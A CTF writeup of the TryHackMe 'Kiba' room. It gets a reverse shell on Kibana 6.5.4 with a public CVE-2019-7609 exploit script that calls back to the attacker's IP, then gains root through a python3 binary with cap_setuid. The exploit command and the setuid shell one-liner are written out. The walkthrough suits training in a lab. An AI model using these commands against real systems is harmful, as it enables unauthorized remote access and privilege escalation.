---
layout: post
title: kiba writeup
subtitle: Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution.
cover-img: /assets/img/path.jpg
thumbnail-img: /assets/img/kiba/logo.png
share-img: /assets/img/path.jpg
tags: [ctf,tryhackme, writeup, kiba]
---

Identify the critical security flaw in the data visualization dashboard, that allows execute remote code execution. Have Fun!


## Here is a machine information

| Title | Kiba | 
| :------ |:--- | 
| Difficulty | Easy | 
| Point | 500 |
| Maker | Stuxnet |
| Infor | This is a free room, which means anyone can deploy virtual machines in the room  | 


## RUST SCAN and Enumeration
Normally, i will use the nmap for first step recon and also collect machine information. After some machine and read the article about rust scan. So what is the rust scan? How is it work? you can find here: https://github.com/RustScan/RustScan. It realy fast than nmap. 


``` rustscan -b 500 machine-ip ```
<em>

-b : the batch size for port scanning, it increases or slows the speed of scanning. Depends on the open file limit of your OS.  If you do 65535 it will do every port at the same time. Although, your OS may not support this [default:4500]
</em>

It will take few time to scan: 

![rustscan](/leiz95/assets/img/kiba/rustscan.png)

We got 3 open ports. Go through each port. In port 5601, this is the kibana application.

![kibana](/leiz95/assets/img/kiba/5601.png)

Kibana is a free and open user interface that lets you visualize your Elasticsearch data and navigate the Elastic Stack. Do anything from tracking query load to understanding the way requests flow through your apps.

We can manual go throung all tag in the kibana. We got version 6.5.4.
Let's google the version which have any public vulnerability.
There is the vulnerability as remote code executed in this version.

![kibana](/leiz95/assets/img/kiba/vulnerability.png)

From the CVE-2019-7609, we can use 2 source from here:
by manual: https://github.com/mpgn/CVE-2019-7609
By auto code: https://github.com/LandGrey/CVE-2019-7609

I will use auto code try to exploit. Clone the code from github

``` git clone https://github.com/LandGrey/CVE-2019-7609.git ```

Exploit by run command:

``` python CVE-2019-7609-kibana-rce.py  -u http://machine-ip:5601 -host yourip port 1234 --shell ```

At your attacker machine, we need to listen the port 1234

![nc](/leiz95/assets/img/kiba/nc.png)

Then wait for shell connect

![shell](/leiz95/assets/img/kiba/shell.png)

From kibana home directory, we have the user flag.

![shell](/leiz95/assets/img/kiba/user.png)

## 	Escalate privileges 

As the hint, Capabilities is a concept that provides a security system that allows "divide" root privileges into different values.
Here is more source if you don't understand it.

- [Working with Linux Capabilities](https://www.vultr.com/docs/working-with-linux-capabilities#)

- [Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

Reading capabilities
To view if a file has any capability set, you can simply run 

`getcap /full/path/to/binary`

If you'd like to find out which capabilities are already set on your system, you can search your whole file-system recursively with the following command:

```getcap -r /```

Run this command on target machine, you will see a lot of error. To ignore error we should run:


```getcap -r / 2>/dev/null```

![shell](/leiz95/assets/img/kiba/result.png)

The thing realy interesting is: `/home/kiba/.hackmeplease/python3 = cap_setuid+ep
`

The python3 can SETUID which can abuse to Escalate root.

From https://gtfobins.github.io/gtfobins/python/#capabilities we have available code to exploit. Let's do it.

```python
 /home/kiba/.hackmeplease/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")' 
 ```

 Yeahm, we got root user.

 ![shell](/leiz95/assets/img/kiba/root.png)

Now we can find root flag via: 

```javasript
find / -type f -name root.txt 2>/dev/null
```

Then we cat the root.txt and got the flag.!!!
